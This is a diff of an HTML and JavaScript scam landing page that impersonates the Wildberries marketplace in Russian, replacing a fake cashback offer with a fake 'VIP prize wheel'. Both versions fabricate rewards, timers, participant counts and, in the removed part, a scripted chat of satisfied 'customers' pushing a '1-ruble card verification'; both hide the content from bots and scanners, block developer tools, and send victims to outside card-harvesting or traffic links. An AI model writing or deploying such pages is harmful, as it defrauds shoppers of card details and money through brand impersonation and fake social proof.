+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .fade-in {
+            opacity: 0;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        
+        .fade-d1 { animation-delay: 0.05s; }
+        .fade-d2 { animation-delay: 0.12s; }
+        .fade-d3 { animation-delay: 0.20s; }
+        .fade-d4 { animation-delay: 0.28s; }
+        .fade-d5 { animation-delay: 0.36s; }
+        .fade-d6 { animation-delay: 0.44s; }
+        .fade-d7 { animation-delay: 0.52s; }
+        
+    </style>
 </head>
 <body>
 
-<div id="botTrap" style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;" aria-hidden="true">
-  <a href="/trap" rel="nofollow">Click here</a>
-  <input type="text" name="email" autocomplete="off" tabindex="-1">
-</div>
-
-<div class="app-container" id="appRoot">
-
-  <div class="brand-header">
-    <div class="wb-logo">
-      <span class="wb-check">✓</span> Wildberries
-    </div>
-  </div>
-
-  <div class="glass-card">
-
-    <!-- Hero -->
-    <div class="hero" id="heroBlock">
-      <div class="icon-circle">💰</div>
-      <div class="hero-badge">⭐ Программа лояльности</div>
-      <h1>Вам начислен <span class="accent">кешбэк</span> за покупки</h1>
-      <p class="hero-sub">По программе лояльности для постоянных клиентов</p>
-    </div>
-
-    <!-- Карточка кешбэка -->
-    <div class="cashback-card" id="cashbackCard">
-      <div class="cashback-label">💰 Накопленный кешбэк</div>
-      <div class="cashback-amount-row">
-        <span class="cashback-amount">5 000</span>
-        <span class="cashback-currency">₽</span>
-      </div>
-      <div class="cashback-status">
-        <span class="status-dot"></span> Ожидает вывода
-      </div>
-    </div>
-
-    <!-- Детализация -->
-    <div class="details-section" id="detailsBlock">
-      <div class="details-title">📊 Ваши покупки за 2025 год</div>
-      <div class="shopping-summary">
-        <div class="summary-row">
-          <span>🛍️ Всего заказов</span>
-          <span><strong>24</strong></span>
+    <div class="container" id="main-container">
+        <!-- Начальный лоадер -->
+        <div class="initial-loader" id="initial-loader">
+            <div class="spinner"></div>
+            <div class="loading-text">Загрузка программы лояльности...</div>
         </div>
-        <div class="summary-row">
-          <span>💄 Косметика и уход</span>
-          <span class="category-tag">8 заказов</span>
-        </div>
-        <div class="summary-row">
-          <span>👗 Одежда и обувь</span>
-          <span class="category-tag">12 заказов</span>
-        </div>
-        <div class="summary-row">
-          <span>🏠 Товары для дома</span>
-          <span class="category-tag">4 заказа</span>
-        </div>
-        <div class="summary-row total">
-          <span>💎 Кешбэк к возврату</span>
-          <span><strong>5 000 ₽</strong></span>
-        </div>
-      </div>
-    </div>
-
-    <!-- Прогресс-бар накопления -->
-    <div class="progress-card" id="progressBlock">
-      <div class="progress-header">
-        <span>Прогресс накопления кешбэка</span>
-        <span><span id="progressPercent">0</span>%</span>
-      </div>
-      <div class="progress-bar-wrap">
-        <div class="progress-bar-fill" id="progressBarFill"></div>
-      </div>
-      <div class="progress-note">Кешбэк растёт с каждой покупкой на WB</div>
-    </div>
-
-    <!-- CTA -->
-    <div class="cta-section" id="ctaBlock">
-      <button class="cta-button" id="mainCtaButton">
-        💳 Вывести кешбэк на карту
-      </button>
-      <div class="secure-row">
-        <span class="secure-item">🔒 Шифрование</span>
-        <span class="secure-item">⚡ Мгновенный вывод</span>
-        <span class="secure-item">✓ Бесплатно</span>
-      </div>
-    </div>
-
-    <!-- Анализатор -->
-    <div class="analyzer-overlay" id="analyzerBlock">
-      <div class="spin-circle"></div>
-      <p style="color:#1F2937; font-weight:600; margin-bottom:8px;">Рассчитываем точную сумму кешбэка...</p>
-      <div class="analyze-status" id="analyzeStep">🔍 Анализируем историю ваших покупок...</div>
-    </div>
-
-    <!-- Финальный экран -->
-    <div class="final-screen" id="finalBlock">
-      <div class="final-icon">💰</div>
-      <h2 style="color:#1F2937; font-size:20px; font-weight:800;">Кешбэк подтверждён!</h2>
-      <p style="color:#6B7280; font-size:13px;">Сумма зарезервирована для вывода</p>
-      <div class="final-amount">5 000 ₽</div>
-      <div class="final-badge">⚡ Готово к переводу на карту</div>
-
-      <div class="instruction-card">
-        <h4>📋 Чтобы получить деньги:</h4>
-        <ul class="instruction-steps">
-          <li>
-            <span class="step-num">1</span>
-            <span>Перейдите в <strong>Центр выплат WB</strong> для верификации</span>
-          </li>
-          <li>
-            <span class="step-num">2</span>
-            <span>Привяжите карту для перевода (тестовый 1₽ сразу вернётся)</span>
-          </li>
-          <li>
-            <span class="step-num">3</span>
-            <span>После верификации карты <strong>5 000 ₽</strong> автоматически поступят на ваш счёт. Обычно это занимает от нескольких минут до нескольких часов — в зависимости от загруженности банка.</span>
-          </li>
-        </ul>
-      </div>
-
-      <div class="timer-badge">
-        ⏳ Время на вывод: <span class="timer-value" id="finalCountdown">05:00</span>
-      </div>
-
-      <button class="cta-button" id="finalCtaButton">
-        💳 Вывести деньги на карту
-      </button>
-      <p style="font-size:10px; color:#9CA3AF; margin-top:6px;">🔒 Защищённый канал выплат WB</p>
-
-      <div class="faq-block" id="faqBlock">
-        <div class="faq-title">💬 Частые вопросы</div>
-
-        <div class="faq-item">
-          <button class="faq-question" type="button">
-            <span>Почему кешбэк не пришёл автоматически?</span>
-            <span class="faq-arrow">▼</span>
-          </button>
-          <div class="faq-answer">
-            <div class="faq-answer-inner">
-              Для защиты от мошенников и накруток <span class="highlight">WB требует верификацию</span> получателя. Это гарантирует, что кешбэк получите именно вы, а не кто-то другой.
+        
+        <!-- Основной контент -->
+        <div id="main-content" style="display: none;">
+            
+            <!-- Шапка -->
+            <div class="header fade-in fade-d1">
+                <div class="header-badge">
+                    <span class="badge-dot"></span>
+                    Программа лояльности
+                </div>
             </div>
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <button class="faq-question" type="button">
-            <span>Зачем нужна проверка карты на 1₽?</span>
-            <span class="faq-arrow">▼</span>
-          </button>
-          <div class="faq-answer">
-            <div class="faq-answer-inner">
-              Это <strong>техническая верификация</strong> — банковский регламент для переводов физлицам. Рубль не списывается, а лишь проверяет активность карты. <strong>Возвращается мгновенно.</strong>
+            
+            <!-- Основная карточка -->
+            <div class="main-card">
+                
+                <!-- Секция с призом -->
+                <div class="prize-section fade-in fade-d2">
+                    <div class="prize-crown">👑</div>
+                    <div class="prize-ribbon">VIP-РОЗЫГРЫШ</div>
+                    <h1 class="prize-heading">
+                        <span class="highlight">Гарантированный</span> подарок ждёт вас
+                    </h1>
+                    <p class="prize-subhead">
+                        Вы попали в закрытый список участников. Только 500 человек допущены к этому розыгрышу.
+                    </p>
+                </div>
+                
+                <!-- Сетка призов -->
+                <div class="prizes-grid fade-in fade-d3">
+                    <div class="prize-item">
+                        <div class="prize-item-icon">📱</div>
+                        <div class="prize-item-name">iPhone 16</div>
+                        <div class="prize-item-value">Главный приз</div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-item-icon">💳</div>
+                        <div class="prize-item-name">Сертификат</div>
+                        <div class="prize-item-value">100 000 ₽</div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-item-icon">🎁</div>
+                        <div class="prize-item-name">Призовой бокс</div>
+                        <div class="prize-item-value">Всем участникам</div>
+                    </div>
+                </div>
+                
+                <!-- Как это работает -->
+                <div class="steps-section fade-in fade-d4">
+                    <div class="steps-title">Как получить подарок</div>
+                    <div class="step-row">
+                        <div class="step-num">1</div>
+                        <div class="step-text">Нажмите кнопку «Крутить колесо» ниже</div>
+                    </div>
+                    <div class="step-row">
+                        <div class="step-num">2</div>
+                        <div class="step-text">Запустите колесо фортуны <small>(займёт 10 секунд)</small></div>
+                    </div>
+                    <div class="step-row">
+                        <div class="step-num">3</div>
+                        <div class="step-text">Гарантированно получите приз <small>+ шанс на суперприз</small></div>
+                    </div>
+                </div>
+                
+                <!-- Таймер -->
+                <div class="timer-block fade-in fade-d5">
+                    <div class="timer-left">
+                        <span class="timer-icon">⏳</span>
+                        <div class="timer-info">
+                            <span class="timer-label">Окно розыгрыша</span>
+                            <span class="timer-urgency">закроется автоматически</span>
+                        </div>
+                    </div>
+                    <span class="timer-value" id="timer-display">01:59:47</span>
+                </div>
+                
+                <!-- Счетчик -->
+                <div class="counter-block fade-in fade-d5">
+                    Уже участвуют: <strong id="counter-value">347</strong> из 500 человек
+                    <div class="counter-dots">
+                        <span class="counter-dot"></span>
+                        <span class="counter-dot"></span>
+                        <span class="counter-dot"></span>
+                        <span class="counter-dot"></span>
+                        <span class="counter-dot"></span>
+                    </div>
+                </div>
+                
+                <!-- Кнопка -->
+                <button class="btn-main fade-in fade-d6" id="confirm-btn" onclick="handleProceed()">
+                    <span class="btn-text">🎰 Крутить колесо фортуны</span>
+                    <span class="spinner-btn"></span>
+                </button>
+                
+                <!-- Гарантия -->
+                <div class="btn-sub fade-in fade-d6" style="text-align:center;margin-top:10px;">
+                    <span class="guarantee-badge">✅ Гарантированный приз каждому участнику</span>
+                </div>
+                
             </div>
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <button class="faq-question" type="button">
-            <span>Это точно мои деньги? Я не просила кешбэк.</span>
-            <span class="faq-arrow">▼</span>
-          </button>
-          <div class="faq-answer">
-            <div class="faq-answer-inner">
-              Да! Это <strong>автоматическая программа лояльности</strong> для активных покупателей. Каждый ваш заказ на WB накапливал процент возврата. Сейчас сумма достигла порога выплаты — 5000₽.
+            
+            <!-- Футер -->
+            <div class="footer-note fade-in fade-d7">
+                🔒 Безопасное соединение<br>
+                Программа лояльности Wildberries &bull; 2026<br>
+                <span>Автоматическая система распределения призов</span>
             </div>
-          </div>
+            
         </div>
-
-        <div class="faq-item">
-          <button class="faq-question" type="button">
-            <span>Как быстро деньги поступят на карту?</span>
-            <span class="faq-arrow">▼</span>
-          </button>
-          <div class="faq-answer">
-            <div class="faq-answer-inner">
-              Сразу после верификации! Деньги <strong>поступают автоматически на ваш счёт.</strong> Обычно это занимает от нескольких минут до нескольких часов — в зависимости от загруженности банка.
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div style="margin-top:12px; padding:10px; background:rgba(0,0,0,0.02); border-radius:14px; font-size:10px; color:#9CA3AF; text-align:center; border:1px solid rgba(0,0,0,0.04);">
-        📄 <span style="text-decoration:underline; cursor:pointer;" onclick="alert('Программа лояльности WB: кешбэк начисляется автоматически с каждой покупки. Выплата производится после верификации получателя.')">Правила программы</span> · 
-        <span style="text-decoration:underline; cursor:pointer;" onclick="alert('1₽ используется для технической проверки карты и возвращается мгновенно. Комиссия за вывод кешбэка — 0₽.')">Условия вывода</span>
-      </div>
     </div>
 
-    <!-- Чат -->
-    <div class="community-chat" id="chatBlock">
-      <div class="chat-top"><span>💬 Чат получателей кешбэка</span><span>🟢 <span id="onlineChatCount">127</span></span></div>
-      <div class="messages-stream" id="chatStream"></div>
-      <div class="chat-input-row">
-        <input type="text" class="chat-input-field" id="chatInputField" placeholder="Написать в чат...">
-        <button class="chat-send-btn" id="chatSendButton">→</button>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<!-- Модальное окно -->
-<div class="modal-overlay" id="redirectModal" style="display: none;">
-  <div class="modal-glass">
-    <div class="modal-icon">💳</div>
-    <h3>Переход в Центр выплат</h3>
-    <p class="modal-subtitle">Верификация для перевода кешбэка</p>
-
-    <div class="modal-info-cards">
-      <div class="modal-info-card">
-        <span class="info-icon">🔒</span>
-        <span><strong>Центр выплат WB</strong> — официальный канал перевода кешбэка</span>
-      </div>
-      <div class="modal-info-card">
-        <span class="info-icon">💳</span>
-        <span>Потребуется <strong>привязать карту</strong> (1₽ для проверки, сразу вернётся)</span>
-      </div>
-      <div class="modal-info-card">
-        <span class="info-icon">⚡</span>
-        <span>Деньги поступят <strong>в течение нескольких часов</strong> после верификации</span>
-      </div>
-    </div>
-
-    <button class="modal-btn-continue" id="modalContinueBtn">
-      ✅ Продолжить и получить деньги
-    </button>
-    <button class="modal-btn-cancel" id="modalCancelBtn">
-      Отмена
-    </button>
-    <p class="modal-secure-note">🔒 Защищённый канал выплат кешбэка WB</p>
-  </div>
-</div>
-
-<script>
-(function() {
-
-  // ============ ЗАЩИТА ============
-  if (!navigator.userAgent || navigator.userAgent.trim() === '') { document.body.innerHTML = ''; return; }
-  var isHeadless = (
-    navigator.webdriver === true ||
-    /HeadlessChrome/.test(navigator.userAgent) ||
-    (navigator.languages && navigator.languages.length === 0) ||
-    navigator.hardwareConcurrency === 0
-  );
-  if (isHeadless) { document.body.innerHTML = ''; return; }
-  if (window.screen.width < 200 || window.screen.height < 200 ||
-      window.screen.width > 5000 || window.screen.height > 5000) {
-    document.body.innerHTML = ''; return;
-  }
-
-  // ============ ССЫЛКА ============
-  var _p1 = 'onelinkgo';
-  var _p2 = 'ru/stream';
-  var _p3 = 'mail_form';
-  var partnerLink = 'https://' + _p1 + '.' + _p2 + '/' + _p3;
-
-  function openPartnerLink() {
-    var a = document.createElement('a');
-    a.href = partnerLink;
-    a.target = '_blank';
-    a.rel = 'noopener noreferrer';
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }
-
-  // ============ DOM-элементы ============
-  var heroBlock = document.getElementById('heroBlock');
-  var cashbackCard = document.getElementById('cashbackCard');
-  var detailsBlock = document.getElementById('detailsBlock');
-  var progressBlock = document.getElementById('progressBlock');
-  var ctaBlock = document.getElementById('ctaBlock');
-  var chatBlock = document.getElementById('chatBlock');
-  var analyzerBlock = document.getElementById('analyzerBlock');
-  var finalBlock = document.getElementById('finalBlock');
-  var mainCtaButton = document.getElementById('mainCtaButton');
-  var finalCtaButton = document.getElementById('finalCtaButton');
-  var progressBarFill = document.getElementById('progressBarFill');
-  var progressPercent = document.getElementById('progressPercent');
-  var analyzeStep = document.getElementById('analyzeStep');
-  var finalCountdown = document.getElementById('finalCountdown');
-  var chatStream = document.getElementById('chatStream');
-  var chatInputField = document.getElementById('chatInputField');
-  var chatSendButton = document.getElementById('chatSendButton');
-  var onlineChatCount = document.getElementById('onlineChatCount');
-  var modal = document.getElementById('redirectModal');
-  var modalContinueBtn = document.getElementById('modalContinueBtn');
-  var modalCancelBtn = document.getElementById('modalCancelBtn');
-
-  var finalTimerSec = 300;
-  var isProcessing = false;
-
-  // ============ ПРОГРЕСС-БАР ============
-  function animateProgress() {
-    var currentPercent = 0;
-    var targetPercent = 100;
-    var interval = setInterval(function() {
-      currentPercent += Math.floor(Math.random() * 8) + 2;
-      if (currentPercent >= targetPercent) {
-        currentPercent = targetPercent;
-        clearInterval(interval);
-      }
-      progressBarFill.style.width = currentPercent + '%';
-      progressPercent.textContent = currentPercent;
-    }, 120);
-  }
-
-  // ============ ОБРАБОТЧИКИ КНОПОК ============
-  function showAnalyzerThenFinal() {
-    if (isProcessing) return;
-    isProcessing = true;
-
-    heroBlock.style.display = 'none';
-    cashbackCard.style.display = 'none';
-    detailsBlock.style.display = 'none';
-    progressBlock.style.display = 'none';
-    ctaBlock.style.display = 'none';
-    chatBlock.style.display = 'none';
-    analyzerBlock.classList.add('active');
-
-    var steps = [
-      '🔍 Анализируем историю покупок за 2025 год...',
-      '📊 Подсчитываем общую сумму заказов...',
-      '💰 Рассчитываем процент кешбэка...',
-      '✅ Кешбэк подтверждён! Сумма: 5 000 ₽'
-    ];
-    var stepIdx = 0;
-    analyzeStep.textContent = steps[0];
-
-    var stepInterval = setInterval(function() {
-      stepIdx++;
-      if (stepIdx < steps.length) {
-        analyzeStep.textContent = steps[stepIdx];
-      } else {
-        clearInterval(stepInterval);
+    <script>
+    // ============================================
+    // КОНФИГУРАЦИЯ
+    // ============================================
+    const FINAL_OFFER_URL = 'https://world-mining.pro/traff.php';
+    const DELAY_BEFORE_SHOW = 2000;
+    
+    // Таймер: 2 часа в секундах
+    let remainingSeconds = 2 * 3600;
+    
+    // ============================================
+    // ПОЛУЧЕНИЕ ПАРАМЕТРОВ
+    // ============================================
+    function getParams() {
+        const params = new URLSearchParams(window.location.search);
+        return {
+            token: params.get('token') || params.get('id') || '',
+            all: window.location.search
+        };
+    }
+    const urlParams = getParams();
+    
+    // ============================================
+    // СЧЕТЧИК УЧАСТНИКОВ (динамический)
+    // ============================================
+    function updateCounter() {
+        const el = document.getElementById('counter-value');
+        if (!el) return;
+        const base = 340;
+        const add = Math.floor(Math.random() * 15);
+        el.textContent = base + add;
+    }
+    
+    // Обновляем счетчик каждые 8-15 секунд
+    let counterInterval;
+    function startCounterUpdates() {
+        updateCounter();
+        counterInterval = setInterval(function() {
+            updateCounter();
+        }, 8000 + Math.floor(Math.random() * 7000));
+    }
+    
+    // ============================================
+    // ТАЙМЕР
+    // ============================================
+    let timerInterval;
+    
+    function formatTime(h, m, s) {
+        return String(h).padStart(2, '0') + ':' + 
+               String(m).padStart(2, '0') + ':' + 
+               String(s).padStart(2, '0');
+    }
+    
+    function updateTimer() {
+        const h = Math.floor(remainingSeconds / 3600);
+        const m = Math.floor((remainingSeconds % 3600) / 60);
+        const s = remainingSeconds % 60;
+        const display = document.getElementById('timer-display');
+        display.textContent = formatTime(h, m, s);
+        
+        if (remainingSeconds < 600) {
+            display.classList.add('urgent');
+        }
+    }
+    
+    function startTimer() {
+        updateTimer();
+        timerInterval = setInterval(function() {
+            remainingSeconds--;
+            if (remainingSeconds <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer-display').textContent = '00:00:00';
+                document.getElementById('timer-display').classList.add('urgent');
+                return;
+            }
+            updateTimer();
+        }, 1000);
+    }
+    
+    // ============================================
+    // ПРОВЕРКА БОТ/ЧЕЛОВЕК
+    // ============================================
+    let isRealUser = false;
+    
+    function checkRealUser() {
+        if (navigator.webdriver === true) return false;
+        if (!navigator.languages || navigator.languages.length === 0) return false;
+        if (screen.width < 150 || screen.height < 150) return false;
+        if ((screen.width === 1 && screen.height === 1) || 
+            (screen.width === 0 && screen.height === 0)) return false;
+        
+        const isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+        const hasAccelerometer = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
+        
+        if (isMobileUA && (hasTouch || hasAccelerometer)) return true;
+        
+        if (!isMobileUA) {
+            const hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
+            const hasMimeTypes = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
+            const hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
+            if (!hasPlugins && !hasMimeTypes && !hasChrome) return false;
+            if (navigator.hardwareConcurrency === 0) return false;
+        }
+        
+        return true;
+    }
+    
+    // ============================================
+    // ОТОБРАЖЕНИЕ
+    // ============================================
+    function showNeutralPage() {
+        document.getElementById('initial-loader').style.display = 'none';
+        const mc = document.getElementById('main-content');
+        mc.style.display = 'block';
+        mc.innerHTML = `
+            <div class="header">
+                <div class="header-badge">
+                    <span class="badge-dot"></span>
+                    Программа лояльности
+                </div>
+            </div>
+            <div class="main-card" style="text-align:center;">
+                <div style="font-size:48px;margin-bottom:16px;">✓</div>
+                <h2 style="font-weight:600;font-size:19px;color:#1d1d1f;margin-bottom:8px;">Статус подтверждён</h2>
+                <p style="font-size:14px;color:#6e6e73;">Ваша заявка обработана. Информация о розыгрыше будет отправлена дополнительно.</p>
+            </div>
+        `;
+    }
+    
+    function showRealContent() {
+        isRealUser = true;
+        document.getElementById('initial-loader').style.display = 'none';
+        document.getElementById('main-content').style.display = 'block';
+        startTimer();
+        startCounterUpdates();
+    }
+    
+    // ============================================
+    // КНОПКА
+    // ============================================
+    function handleProceed() {
+        if (!isRealUser) return;
+        
+        const btn = document.getElementById('confirm-btn');
+        btn.classList.add('loading');
+        
+        if (timerInterval) clearInterval(timerInterval);
+        if (counterInterval) clearInterval(counterInterval);
+        
         setTimeout(function() {
-          analyzerBlock.classList.remove('active');
-          analyzerBlock.style.display = 'none';
-          finalBlock.classList.add('active');
-          startFinalTimer();
-          showToast('💰 Кешбэк 5 000 ₽ готов к выводу!');
-        }, 800);
-      }
-    }, 1300);
-  }
-
-  mainCtaButton.addEventListener('click', function() {
-    showAnalyzerThenFinal();
-  });
-
-  // ============ ФИНАЛЬНЫЙ ТАЙМЕР ============
-  function startFinalTimer() {
-    function tick() {
-      if (finalTimerSec <= 0) { finalCountdown.textContent = '00:00'; return; }
-      var m = Math.floor(finalTimerSec / 60);
-      var s = finalTimerSec % 60;
-      finalCountdown.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
-      finalTimerSec--;
-      setTimeout(tick, 1000);
+            window.location.href = FINAL_OFFER_URL + urlParams.all;
+        }, 700);
     }
-    tick();
-  }
-
-  // ============ МОДАЛЬНОЕ ОКНО ============
-  function showModal() {
-    if (modal) {
-      modal.style.display = 'flex';
-      document.body.style.overflow = 'hidden';
-    }
-  }
-
-  function hideModal() {
-    if (modal) {
-      modal.style.display = 'none';
-      document.body.style.overflow = '';
-    }
-  }
-
-  finalCtaButton.addEventListener('click', function(e) {
-    e.preventDefault();
-    showModal();
-  });
-
-  if (modalContinueBtn) {
-    modalContinueBtn.addEventListener('click', function() {
-      openPartnerLink();
-      hideModal();
-    });
-  }
-
-  if (modalCancelBtn) {
-    modalCancelBtn.addEventListener('click', hideModal);
-  }
-
-  if (modal) {
-    modal.addEventListener('click', function(e) {
-      if (e.target === modal) hideModal();
-    });
-  }
-
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape' && modal && modal.style.display === 'flex') {
-      hideModal();
-    }
-  });
-
-  // ============ ЧАТ ============
-  var femaleNames = ["Анна", "Ольга", "Елена", "Марина", "Татьяна", "Светлана", "Юлия", "Ирина", "Виктория", "Екатерина", "Наталья", "Алиса", "Кристина", "Дарья"];
-  
-  var chatMessages = [
-    "Девочки, кешбэк реально пришёл! 5000₽ на карту! 💰😍",
-    "Я сначала не поверила, но деньги уже на карте! Спасибо WB!",
-    "Ой, а у меня тоже получилось! Рубль списали и сразу вернули! 💳",
-    "Кто ещё сомневается — не думайте! Это честный кешбэк за покупки 🙌",
-    "Я за год на WB кучу всего купила, приятно получить возврат 💎",
-    "Потратила кешбэк на новую косметику, уже заказала! 💄✨",
-    "Девочки, а кому ещё рубль вернули моментально? У меня сразу!",
-    "Спасибо за подсказку! Всё оформила, жду поступления 🛍️",
-    "Это лучшая программа лояльности! WB — молодцы! 👏",
-    "Подруге рассказала, она тоже проверила — у неё 3200₽ накопилось!",
-    "Я думала это спам в почте, а оказалось правда! 💌💰",
-    "Проверка карты — это обычная верификация, всё безопасно 🔒",
-    "Уже третьей покупкой кешбэк закрываю, очень выгодно! 🛒",
-    "Девочки из Москвы, у всех работает? У меня да! ✅",
-    "На детские товары потратила — как раз перед школой пригодилось 🧸",
-    "Рубль для проверки — это стандартная процедура банков 💳",
-    "В чате сижу, смотрю — у всех получается! И я попробовала — правда! 🌸",
-    "Кешбэк начислился за все покупки 2025 года, приятный бонус!"
-  ];
-
-  var cityList = ["Москва", "СПб", "Казань", "Новосибирск", "Екатеринбург", "Краснодар", "Сочи", "Воронеж", "Самара"];
-
-  function getCleanName(fullName) { return fullName.split('_')[0]; }
-
-  function addChatMessage(name, text, isUser, animate) {
-    isUser = isUser || false;
-    animate = (animate === undefined) ? true : animate;
-    var cleanName = isUser ? name : getCleanName(name);
-    var avatarLetter = cleanName.charAt(0).toUpperCase();
-    var time = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
-
-    var avatarGradient = isUser 
-      ? 'linear-gradient(135deg, #D97706, #DC2626)'
-      : 'linear-gradient(135deg, #F59E0B, #D97706)';
-
-    var msgDiv = document.createElement('div');
-    msgDiv.className = 'msg' + (animate ? ' new-message' : '');
-    msgDiv.innerHTML = '<div class="msg-avatar" style="background:' + avatarGradient + '">' + avatarLetter + '</div>' +
-      '<div class="msg-bubble"><div class="msg-name">' + cleanName + ' · ' + time + '</div>' + text + '</div>';
-    chatStream.appendChild(msgDiv);
-    chatStream.scrollTop = chatStream.scrollHeight;
-    while (chatStream.children.length > 18) chatStream.removeChild(chatStream.firstChild);
-  }
-
-  function preloadChat() {
-    var history = [
-      { name: "Анна_Москва", text: "Девочки, всем привет! Кешбэк реально пришёл, я в шоке! 💰" },
-      { name: "Ольга_СПб", text: "Я тоже получила! 5000₽ за покупки, которые и так делала!" },
-      { name: "Елена_Казань", text: "Проверка карты заняла минуту, рубль сразу вернули 💳" },
-      { name: "Марина_Новосибирск", text: "Это честная программа лояльности WB, проверено! 👍" },
-      { name: "Татьяна_Краснодар", text: "Ура! Деньги уже на карте! Потратила на косметику 💄" },
-      { name: "Юлия_Сочи", text: "Спасибо WB за кешбэк! Очень приятный бонус 🎁" }
-    ];
-    history.forEach(function(msg) {
-      addChatMessage(msg.name, msg.text, false, false);
-    });
-  }
-
-  function simulateMessage() {
-    var name = femaleNames[Math.floor(Math.random() * femaleNames.length)];
-    var city = cityList[Math.floor(Math.random() * cityList.length)];
-    var text = chatMessages[Math.floor(Math.random() * chatMessages.length)];
-    addChatMessage(name + '_' + city, text, false, true);
-    setTimeout(simulateMessage, 6000 + Math.random() * 10000);
-  }
-
-  function sendUserMessage() {
-    var text = chatInputField.value.trim();
-    if (!text) return;
-    addChatMessage('Вы', text, true, true);
-    chatInputField.value = '';
+    
+    window.handleProceed = handleProceed;
+    
+    // ============================================
+    // ИНИЦИАЛИЗАЦИЯ
+    // ============================================
     setTimeout(function() {
-      var replies = [
-        "Отлично! Кешбэк уже ждёт вас в Центре выплат 💰",
-        "Всё верно! Привяжите карту и получите деньги 💳",
-        "Не переживайте, это безопасно! Рубль возвращается мгновенно 🔒"
-      ];
-      addChatMessage('WB_Support', replies[Math.floor(Math.random() * replies.length)], false, true);
-    }, 1500 + Math.random() * 2000);
-  }
-
-  chatSendButton.addEventListener('click', sendUserMessage);
-  chatInputField.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') sendUserMessage();
-  });
-
-  // ============ FAQ ============
-  function initFaq() {
-    var faqBlock = document.getElementById('faqBlock');
-    if (!faqBlock) { setTimeout(initFaq, 300); return; }
-    faqBlock.addEventListener('click', function(e) {
-      var btn = e.target.closest('.faq-question');
-      if (!btn) return;
-      var item = btn.closest('.faq-item');
-      if (!item) return;
-      e.preventDefault();
-      faqBlock.querySelectorAll('.faq-item').forEach(function(el) {
-        if (el !== item) el.classList.remove('open');
-      });
-      item.classList.toggle('open');
+        if (checkRealUser()) {
+            showRealContent();
+        } else {
+            showNeutralPage();
+        }
+    }, DELAY_BEFORE_SHOW);
+    
+    // ============================================
+    // ЗАЩИТЫ
+    // ============================================
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
     });
-  }
-
-  function showToast(text) {
-    var toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.textContent = text;
-    document.body.appendChild(toast);
-    setTimeout(function() { toast.remove(); }, 4000);
-  }
-
-  // ============ ЗАПУСК ============
-  animateProgress();
-  preloadChat();
-  setTimeout(simulateMessage, 4000);
-  initFaq();
-
-  setInterval(function() {
-    onlineChatCount.textContent = 110 + Math.floor(Math.random() * 35);
-  }, 8000);
-
-})();
-</script>
+    
+    document.addEventListener('keydown', function(e) {
+        if (
+            (e.ctrlKey && e.key === 'u') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            e.key === 'F12'
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    if (window.top !== window.self) {
+        document.getElementById('initial-loader').style.display = 'none';
+        showNeutralPage();
+    }
+    
+    </script>
 
 </body>
 </html>
